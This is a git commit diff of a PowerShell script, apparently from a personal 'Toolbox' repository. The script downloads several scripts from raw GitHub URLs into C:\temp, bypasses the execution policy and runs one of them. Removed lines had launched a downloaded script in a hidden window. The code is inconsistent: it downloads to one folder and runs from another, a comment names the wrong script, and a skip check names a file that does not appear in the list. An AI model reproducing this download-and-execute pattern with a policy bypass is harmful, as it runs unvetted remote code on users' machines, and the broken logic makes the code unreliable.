222f3be0f6e1a646e1ba8661bfefb714998daa20
ctrlos2 <161234397+ctrlos2@users.noreply.github.com>
2024-06-25 10:47:23 +0200

    Update 2.ps1

--- print/2.ps1
+++ print/2.ps1
@@ -1,3 +1,13 @@
+# Define the target directory where files will be downloaded
+$targetDir = "C:\temp"
+
+# Check if the temp folder exists, create it if it doesn't
+$tempFolderPath = Join-Path -Path "C:\" -ChildPath "temp"
+if (-not (Test-Path -Path $tempFolderPath -PathType Container)) {
+    New-Item -Path $tempFolderPath -ItemType Directory | Out-Null
+}
+
+
 $urls = @(
     "https://raw.githubusercontent.com/ctrlos2/Toolbox/main/print/2/starter.ps1",
     "https://raw.githubusercontent.com/ctrlos2/Toolbox/main/print/22222.ps1",
@@ -10,8 +20,7 @@ $urls = @(
 
 $tempDir = [System.IO.Path]::GetTempPath()
 
-# Define the target directory where files will be downloaded
-$targetDir = "C:\temp"
+
 
 function Download-File {
     param (
@@ -25,7 +34,7 @@ function Download-File {
 foreach ($url in $urls) {
     $fileName = [System.IO.Path]::GetFileName($url)
     $destinationPath = [System.IO.Path]::Combine($targetDir, $fileName)
-    if ($fileName -ne "starter.ps1") {
+    if ($fileName -ne "222222.ps1") {
         Download-File -url $url -destination $destinationPath > $null  # Redirect output to $null to suppress download messages
     }
 }
@@ -33,16 +42,8 @@ foreach ($url in $urls) {
 # Set execution policy
 Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
 
-# Run starter.ps1 in a hidden PowerShell window
-$starterScriptPath = [System.IO.Path]::Combine($targetDir, "starter.ps1")
-Write-Output "Running script $starterScriptPath"
-Start-Process -FilePath "powershell.exe" -ArgumentList "-File `"$starterScriptPath`"" -WindowStyle Hidden -NoNewWindow
-
-
-# Run starter.ps1 in a visible PowerShell window
-$starterScriptPath = [System.IO.Path]::Combine($targetDir, "starter.ps1")
-Write-Output "Running script $starterScriptPath"
-Start-Process -FilePath "powershell.exe" -ArgumentList "-File `"$starterScriptPath`""
-
+# Run the 12.ps1 script
+$scriptPath = [System.IO.Path]::Combine($tempDir, "22222.ps1")
+powershell.exe -File $scriptPath
 # Wait for a few seconds to ensure starter.ps1 has started
 Start-Sleep -Seconds 5
